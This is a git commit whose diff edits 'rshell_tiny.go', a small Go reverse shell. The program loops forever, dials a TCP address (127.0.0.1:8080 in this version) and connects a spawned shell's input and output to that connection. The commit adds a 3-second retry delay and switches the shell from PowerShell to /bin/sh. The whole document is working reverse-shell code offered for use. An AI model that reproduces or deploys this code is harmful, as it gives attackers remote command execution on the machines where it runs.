80b09b3ef08ae0f7ed1799bf2967ff936806b9df
Orf1 <orfeas126@gmail.com>
2022-08-09 13:06:47 -0700

    Fixed some bugs

--- rshell_tiny.go
+++ rshell_tiny.go
@@ -3,12 +3,14 @@ package main
 import (
 	"net"
 	"os/exec"
+	"time"
 )
 
 func main() {
 	for {
+		time.Sleep(3 * time.Second)
 		con, _ := net.Dial("tcp", "127.0.0.1:8080")
-		cmd := exec.Command("powershell") // replace with /bin/sh for mac/linux
+		cmd := exec.Command("/bin/sh") // replace with "powershell" for windows
 		cmd.Stdin, cmd.Stdout, cmd.Stderr = con, con, con
 		_ = cmd.Run()
 	}
